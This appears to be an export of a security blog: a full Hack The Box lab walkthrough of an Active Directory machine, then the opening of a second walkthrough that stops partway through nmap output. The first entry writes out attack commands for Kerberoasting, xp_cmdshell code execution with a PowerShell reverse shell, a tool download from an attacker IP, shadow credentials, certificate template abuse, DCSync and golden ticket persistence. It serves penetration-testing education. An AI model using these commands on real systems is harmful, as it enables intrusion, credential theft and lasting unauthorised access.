        "content": "EscapeTwo Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/EscapeTwo How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: Assumed Breach Box: This box scenario assumes that the Active Directory (AD) environment has already been breached and that we have access to valid credentials. User: rose Pass: KxEPkKe6R8su This approach reflects a more realistic model, given that direct breaches of AD environments from external footholds are increasingly rare today. +Note+: Even with assumed credentials, I’ll still conduct my standard enumeration process as if I don’t have them. This ensures I don’t overlook any findings just because access is available. Comprehensive documentation of all discoveries remains essential. NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:55:29 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 07:56 GMT Nmap scan report for 10.129.146.182 Host is up (0.038s latency). Not shown: 988 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds Initial thoughts: Pretty Standard affair for AD, DNS, Kerberos, RPC, LDAP but also MSSQL. Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/EscapeTwo/scans/nmap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:56:07 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 07:56 GMT Nmap scan report for 10.129.146.182 Host is up (0.045s latency). Not shown: 65509 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 07:59:29Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.129.146.182:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 | ms-sql-ntlm-info: | 10.129.146.182:1433: | Target_Name: SEQUEL | NetBIOS_Domain_Name: SEQUEL | NetBIOS_Computer_Name: DC01 | DNS_Domain_Name: sequel.htb | DNS_Computer_Name: DC01.sequel.htb | DNS_Tree_Name: sequel.htb |_ Product_Version: 10.0.17763 |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2025-01-13T07:53:13 |_Not valid after: 2055-01-13T07:53:13 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name) |_ssl-date: 2025-01-13T08:01:07+00:00; +1s from scanner time. | ssl-cert: Subject: commonName=DC01.sequel.htb | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC01.sequel.htb | Not valid before: 2024-06-08T17:35:00 |_Not valid after: 2025-06-08T17:35:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49685/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49686/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49702/tcp open msrpc Microsoft Windows RPC 49718/tcp open msrpc Microsoft Windows RPC 49737/tcp open msrpc Microsoft Windows RPC 61431/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-01-13T08:00:32 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 1s, deviation: 0s, median: 0s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 258.16 seconds Findings: LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Computers Users All domain objects A file containing all description fields It will also search the domain for any service/svc accounts and place them in a folder too. We have the naming context of the domain: kali in HTB/BlogEntriesMade/EscapeTwo/scans/ldap 🍣 main 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 07:58:14 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box -u $user -p $pass ------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.146.182 • Domain Name : sequel.htb • Server Name : DC01 • Forest Level: 7 • Domain Level: 7 It turns out the anonymous bind is (+NOT+) enabled and we get the below information \u0026amp; our creds do not appear to work for the LDAP.\n------------------------------------------------------------ Connection Attempts ------------------------------------------------------------ • Attempting SSL connection... ⚠️ Connection established but no read access • Attempting non-SSL connection... ⚠️ Connection established but no read access ------------------------------------------------------------ Connection Failed ------------------------------------------------------------ ⚠️ Could not establish LDAP connection • Anonymous bind may be disabled (good security practice) • Credentials may be incorrect • Server may be unreachable • LDAP/LDAPS ports may be filtered We have the domain functionality level:\n• Forest Level: 7 • Domain Level: 7 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name \u0026amp; domain name:\n------------------------------------------------------------ Server Information ------------------------------------------------------------ • IP Address : 10.129.146.182 • Domain Name : sequel.htb • Server Name : DC01 It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables: Updated Domain \u0026amp; Machine Variables for Testing:\nNow that I have this information, I can update the domain and machine variables used in tests: update_var domain \u0026#34;sequel.htb\u0026#34; update_var machine \u0026#34;DC01\u0026#34; Updating /etc/hosts for DNS and LDAP Queries:\nI update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: sudo echo \u0026#34;$box $domain $machine.$domain $machine\u0026#34; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host’s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.\nsudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries:\ndnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing out of the ordinary. Kerberos 88: Using netexec or impacket for ASReproasting: We should always try and asreproast with a null/guest session as it can lead to an easy win:\nnetexec ldap $box -u $user -p $pass --asreproast asrep.txt Nothing found. Using netexec for Kerberoasting: As we have creds we can kerberoast:\nnetexec ldap $box -u $user -p $pass --kerberoast kerb.txt Two service accounts, ca_svc \u0026amp; sql_svc are kerberoastable. I am assuming that ca will be Certificate Authority. Attempting To Crack Kerberos Tickets: I attempt to crack the kerberos tickets but they do not crack: hashcat -m 13100 kerb.txt ~/Wordlists/rockyou.txt Lets move onto further enumeration. Performing a Bloodhound Collection: I use bloodhound-python to perform a collection.\nbloodhound-python -d $domain -ns $box -c All -u $user -p $pass I then import these into bloodhound for investigation. Bloodhound Findings: There is only 1 domain admin:\nStandard users have DC Sync Privileges:\nOur user has no overly permissive rights:\nSmall domain with only 8 users:\nsql_svc looks to be a good target as it will most likely have access to the SQL server but is also a member of these groups:\nca_svc is as suspected a member of the cert publishers group so can issue certs. We should look into using certipy-ad to enumerate the CA further.\nEnumerating The CA Using Certipy-ad: certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box kali in content-org/Walkthroughs/HTB/BlogEntriesMade/EscapeTwo 🍣 main 3GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:34:09 zsh ❯ certipy-ad find -vulnerable -u $user@$domain -p $pass -dc-ip $box Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; via CSRA [!] Got error while trying to get CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Got CA configuration for \u0026#39;sequel-DC01-CA\u0026#39; [*] Saved BloodHound data to \u0026#39;20250113084633_Certipy.zip\u0026#39;. Drag and drop the file into the BloodHound GUI from @ly4k [*] Saved text output to \u0026#39;20250113084633_Certipy.txt\u0026#39; [*] Saved JSON output to \u0026#39;20250113084633_Certipy.json\u0026#39; I upload these to bloodhound but they do not work, so let\u0026rsquo;s look at he .json Our current user does not have access to any vulnerable templates. SMB 445: Enumerating SMB shares using netexec: netexec smb $box -u $user -p $pass --shares We have READ rights over the \u0026ldquo;Accounting Department\u0026rdquo; share Enumerating the Accounting Department Share: I connect using smbclient:\nsmbclient -U $domain\\\\$user \u0026#34;\\\\\\\\$box\\\\Accounting Department\u0026#34; There are two spreadsheets in the share:\nI download them both:\nReading/Extracting Usernames \u0026amp; Passwords From The Spreadsheets: I try and open the spreadsheets using Open Office, but they appear to be cipher text:\nLuckily .xlsx are just file archives that contain spreadsheets. You can read more about them on this page , however the key part is this (bolding added by me)\nIn Excel 2007, XLSX files replaced .XLS files as the standard file for saving spreadsheets in Excel. Unlike XLS files, which store spreadsheet data in a single binary file, XLSX files are saved in the Open XML format, which stores data as separate files and folders in a compressed Zip package. The archive includes the [Content_Types].xml file, which describes the spreadsheet, and an .XML file for each worksheet within the spreadsheet.\nThis means we can manually extract the archive on our host to view the individual sheets contents. Extracting the contents of the xlsx files manually: unzip accounting_2024.xlsx unzip accounts.xlsx Reading the file \u0026ldquo;SharedStrings.xml\u0026rdquo; from the accounts.xlsx extraction we can see clear text passwords and emails.\nExtracting the contents of the xlsx files online: https://jumpshare.com/viewer/xlsx accounting_2024.xlsx content:\naccounts.xlsx contains user credentials:\nRunning Hashcat again: I re-run hashcat with newly extracted passwords against the extracted Kerberos tickets but they do not crack. Testing Credentials: I test the newly found credentials and find that Oscars are also valid:\nnetexec smb $box -u Users.txt -p Passwords.txt --continue-on-success | grep [+] Checking Bloodhound I can see that Oscar is a member of the Accounting Department group.\nThis group does not appear to have any interesting outbound object control however it\u0026rsquo;s good to note he is part of this group for later on. 2. Foothold: Enumerating As Oscar: I check what shares we have access to as Oscar \u0026amp; can see we have access to the Users share. netexec smb $box -u $user -p $pass --shares Accessing The Users Share As Oscar: I use smbclient to access the share.\nsmbclient -U $domain\\\\$user \u0026#34;\\\\\\\\$box\\\\Users\u0026#34; I check the \u0026ldquo;Default\u0026rdquo; folder present and it appears to be a default user installation of windows: Some initial enumeration does not yield any results MSSQL 1433: Enumerating The MSSQL Service: I check if the retrieved SQL credentials work against the MSSQL service using netexec:\nnetexec mssql $box -u $user -p $pass --local-auth It works and we can connect. Even though our name is sa which would indicate it is a sysadmin I use the mssql_priv to check if they are and if not to elevate it.\nnetexec mssql $box -u $user -p $pass --local-auth -M mssql_priv We are a sysadmin so let\u0026rsquo;s connect and get a reverse shell. Connecting to the MSSQL Service: We can use impacket-mssqlclient to connect to the instance.\nimpacket-mssqlclient $user@$box:$pass As we are a sysadmin we can enable xp_cmdshell\nxp_cmdshell primer: Core Functionality:\nAllows execution of Windows command shell (cmd.exe) commands directly from within SQL (+RCE+) Extended stored procedure that acts as a bridge between SQL Server and the operating system Returns command output as rows of text in the result set Limited to 8192 bytes for command strings Configuration Settings:\nDisabled by default since SQL Server 2005 Restricted to sysadmin role members only (which we are) Enabling xp_cmdshell For RCE On The Host: There are multiple ways we can enable xp_cmdshell, I will share two.\nManual method, from an MSSQL shell we can enter the below commands.\n-- Enable advanced options sp_configure \u0026#39;show advanced options\u0026#39;, 1; RECONFIGURE; -- Enable xp_cmdshell sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1; RECONFIGURE; Automatic method using impacket-mssqlclient built in functionality:\nLuckily impacket has built in functionality to enable this. -- Enable enable_xp_cmdshell RECONFIGURE Using RCE VIA xp_cmdshell To Get A Reverse Shell: I test a command \u0026amp; it works as expected. We have RCE of the underlying host.\nEXEC xp_cmdshell \u0026#39;dir C:\\\u0026#39;; -- We run commands like EXEC xp_cmdshell \u0026#39;[Command]\u0026#39;; +Important Note+: I found that xp_cmdshell would default to off again after a period of time so I had to re-enable it to execute commands. I go to revshells and use the base64 encoded powershell example. I start my listener on my local host and then enter the powershell base64 encoded reverse shell as a command via xp_cmdshell: EXEC xp_cmdshell \u0026#39;powershell -e [base64ReverseShell]\u0026#39; It connects. Enumerating As sql_svc: I check for the user flag but it is not present, so this makes me think that our target user is the user ryan who is also listed on this machine. Looking at their profile in Bloodhound, we can see they are part of the \u0026ldquo;Management Department\u0026rdquo; group which looks like it could be a good target. More importantly we can also see ryan has WriteOwner privileges over the CA_SVC account, which means we effectively have full control over that account if we can get control of him. I download winPEAs onto the host.\nwget http://10.10.14.38:9000/winPEASany.exe -o peas.exe I run it but nothing immediately jumps out. I check for contents of users descriptions \u0026amp; info fields, incase there are any stored credentials:\nGet-AdUser -Properties * -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=user)(description=*))\u0026#39; | select samaccountname,description +Note+: This returns only users who\u0026rsquo;s description field is not blank Get-AdUser -Properties * -LDAPFilter \u0026#39;(\u0026amp;(objectCategory=user)(info=*))\u0026#39; | select samaccountname,info By manual enumeration I find the sql_svc password hardcoded in C:\\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI\nI verify it\u0026rsquo;s valid: +Note+: I actually wasted a lot of times on winPEAS etc when simple manual enumeration would have gotten me here far quicker. It\u0026rsquo;s important to not become too reliant on automated tools. Discovering Password Re-use for ryan \u0026amp; sql_svc: I perform password spraying with the password found in the sql-Configuration.INI file and find that the user sql_svc \u0026amp; ryan both share the same password.\nnetexec smb $box -u Users.txt -p Passwords.txt --shares --continue-on-success 3. Lateral Movement: Connecting As Ryan: I use evil-winrm to connect as Ryan\nevil-winrm -i $box -u $user -p $pass Lets get the user flag:\n4. Privilege Escalation: Taking Control of ca_svc: As ryan we have the WriteOwner privilege over CA_SVC so we effectively own the account. WriteOwner Privilege Primer: If we have WriteOwner over a: User: We can assign all rights to another account which will allow us to perform a Password Reset via a Force Change Password Attack, Targeted Kerberoasting Attack or a Shadow Credentials Attack. I would like to perform a targeted Kerberoasting Attack or Shadow Credentials attack, mainly as I do not like changing users passwords if I don\u0026rsquo;t have to. Group: We can add or remove members after we grant the new owner (which we control full privileges) GPO: We can modify it. GPO Attacks as well other DACL abuses (such as computer attacks). Targeted Kerberoasting Attack Primer: To perform this attack we need 1 of these rights over the user: WriteOwner GenericAll GenericWrite WriteProperty Validated-SPN WriteProperties Luckily as we have WriteOwner which means we have the ability to modify object security descriptors, regardless of permissions on the object\u0026rsquo;s DACL. +This works by doing the following:+\nAttach/generate an SPN for the user account. Request TGS for the user account. As TGS is encrypted with NTLM password hash we can then attempt to crack and overtake user account. Luckily targetedKerberoast does steps 1-2 automatically. Attack Chain Attempt 1: Targeted Kerberoasting: Attack Chain: Perform a Targeted Kerberoasting Attack to get the hash of the ca_svc user. Attempt to crack the hash. python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user ca_svc -o ca_svc.kerb I attempt to crack the hash but it does not crack.\nAttack Chain Attempt 2: Shadow Credentials Attack: I have a full article explaining how the shadow credentials attack works here:\nhttps://bloodstiller.com/articles/shadowcredentialsattack/ Attack Chain:\nMake ourselves Owner of the ca_svc user account. Using impacket-owneredit. Grant ourselves full privileges over the ca_svc account. Using impacket-dacledit. Perform Shadow Credentials Attack. Using pywhisker. Use gettgtpkinit to create a .ccache. Use getnthash to extract the NT has of the ca_svc user. +Note+: Some of these tools can be finicky to install. I have a post here - https://bloodstiller.com/walkthroughs/certified-box/#performing-the-shadow-credentials-attack-against-management-svc which details how to install each of the tools and issues you may face.\nModify ownership so Ryan has full control of ca_svc:\nimpacket-owneredit -action write -new-owner \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; $domain/$user:$pass Grant ryan full privileges over the user ca_svc:\nimpacket-dacledit -action \u0026#39;write\u0026#39; -rights \u0026#39;FullControl\u0026#39; -principal \u0026#39;ryan\u0026#39; -target \u0026#39;ca_svc\u0026#39; $domain/$user:$pass Add shadow credentials to the ca_svc account \u0026amp; export .PEM\npython3 pywhisker.py -d $domain -u $user -p $pass --target \u0026#34;CA_SVC\u0026#34; --action \u0026#34;add\u0026#34; --filename CACert --export PEM Ignore the capitlization of CA_SVC it doesn\u0026rsquo;t matter. +Deep Dive+: I have a deep dive on shadow credentials available here if you want to the how behind this attack vector: https://bloodstiller.com/articles/shadowcredentialsattack/ Requesting a TGT for ca_svc with PKINITtools getgtgkinit\nNow we perform the same process again to be able to extract their hash by using the .pem files we have retrieved to export a .ccache we can authenticate with. python3 /home/kali/windowsTools/PKINITtools/gettgtpkinit.py -cert-pem CACert_cert.pem -key-pem CACert_priv.pem $domain/ca_svc ca_svc.ccache Next we will load the .ccache into our KRB5CCNAME variable as we will need this for next step:\nexport KRB5CCNAME=./ca_svc.ccache Requesting the ca_svc user hash with PKINITtools getnthash:\nExtract the NTHash for the ca_svc user: python3 /home/kali/windowsTools/PKINITtools/getnthash.py -key 431c[SNIP]6aee9c22ff3391d9 $domain/CA_SVC We now have the ca_svc users NT hash. Verify the hash is valid:\nWe now own the ca_svc user. Re-running Certipy As ca_svc: As we are in control of ca_svc let\u0026rsquo;s re-check if we have access to any vulnerable certificates to privesc: certipy-ad find -vulnerable -u $user@$domain -hashes :$hash -dc-ip $box So we can see there is a vulnerable cert available: DunderMifflinAuthentication and it\u0026rsquo;s vulnerable to the ESC4 attack vector. As we are part of the Cert Publishers group we can perform this attack:\nPerforming ESC4 Certificate Attack To Get An Admin Certificate: Checking the certipy git repo it details what we need to do to perform this attack. https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.\nSo we effectively perform an ESC1 attack by overwriting the template. Backup original cert:\nAs we overwrite the cert to perform this attack I will make a backup. certipy template -username ca_svc@$domain -hashes :$hash -template DunderMifflinAuthentication -save-old Perform ESC1 attack on the cert:\nWe can specify an arbitrary SAN with the -upn or -dns parameter.\nThis is the correct command, however read the section below if you get a DNS error.\nertipy req -username ca_svc@$domain -hashes :$hash -ca sequel-DC01-CA -target $machine.$domain -template DunderMifflinAuthentication -upn administrator@$domain -ns $box +Troubleshooting+: If you get the error CERTSRV_E_SUBJECT_DNS_REQUIRED:\nI got this error a lot and went down rabbit holes trying to fix it. Whereas it actually seems to be down to some sort cleanup script running on the host. How to get it working: I was able to get it working by quickly chaining step 1 (Backup Script) \u0026amp; 2 (ESC1 Attack) If you look at the time stamp you can see that I had to run these 7 seconds apart to get the attack chain to work. Authenticate as the Administrator using the certificate:\nNow we authenticate with the certificate, to receive the NT hash of the Administrator user: certipy-ad auth -pfx administrator.pfx -domain $domain Verify it works:\nUsing evil-winrm\nevil-winrm -i $box -u administrator -H $hash Using the .ccache\n#Load the .ccache into the KRB5CCNAME var export KRB5CCNAME=./administrator.ccache #Use impacket-psexec impacket-psexec -k -no-pass $machine.$domain I knew it work but always better to validate. Lets get the root flag:\n5. Persistence: You may be wondering why we would look at persistence if we already have a valid administrator certificate. However if we examine the expiration time on the cert we can see its only valid for 10 hours.\nklist So instead I will dump the NTDS.dit \u0026amp; create a golden ticket for good measure.\nDumping NTDS.dit/DCSync attack: Perform DCSync attack using netexec:\nnetexec smb $box -u administrator --use-kcache -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026#34;$file\u0026#34; | cut -d \u0026#39;:\u0026#39; -f1,2,4 --output-delimiter=\u0026#39; \u0026#39; | awk \u0026#39;{print $3, $2, $1}\u0026#39;; printf \u0026#39;\\n\u0026#39;; done Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids -k -no-pass I store this in the variable $sid Using impacket-secretsdump to retrieve the aeskey of the krbtgt account:\nimpacket-secretsdump $domain/$user@$box -hashes :$hash I store krbtgt:aes256 value in the variable $krbtgt Sync our clock to the host using ntpdate:\n#Using ntpdate sudo ntpdate -s $domain #Using faketime faketime \u0026#34;$(ntpdate -q $domain | cut -d \u0026#39; \u0026#39; -f 1,2)\u0026#34; Using impacket-ticketer to create the Golden Ticket:\n#Using -aeskey impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Verify the ticket is loaded into memory:\nklist As we can see this ticket lasts for 10 years, which is better than 10 hours. Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target’s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the KRBTGT account, not individual users. Lessons Learned: What did I learn? Stop jumping to flashy techniques when you havent\u0026rsquo; even performed basic enumeration just yet. (Finding password re-use in a file) I learned that even though I know the attack path if someone has put a cleanup script in place it will cause me to go down a rabbit hole, it\u0026rsquo;s one of the few times where faster is better. What silly mistakes did I make? using \\\\ on http request e.g http:\\\\ DAMN YOU WINDOWS and your backslashes. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at bloodstiller dot com\n",

        "title": "Cap HTB Walkthrough: PCAP Analysis, Linux Capabilities, and Linux Privilege Escalation",
        "tags": ["Box","HTB","Easy","Linux","gunicorn","python","ftp","WSGI","IDOR","pcap","wireshark","cap","cap-setuid","capabilities","privilege escalation","network analysis",],
        "content": "Cap Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Cap How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 06:27 BST Nmap scan report for 10.129.255.182 Host is up (0.024s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Initial thoughts: FTP, SSH \u0026amp; Web. As usual we will skip SSH at the moment and take a look at web \u0026amp; FTP to see what there is. Comprehensive Scans: In depth scan TCP:\n#Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds [sudo] password for kali: Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 06:27 BST Nmap scan report for 10.129.255.182 Host is up (0.021s latency). Not shown: 65532 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA) | 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA) |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http Gunicorn |_http-server-header: gunicorn |_http-title: Security Dashboard Device type: general purpose|router Running: Linux 5.X, MikroTik 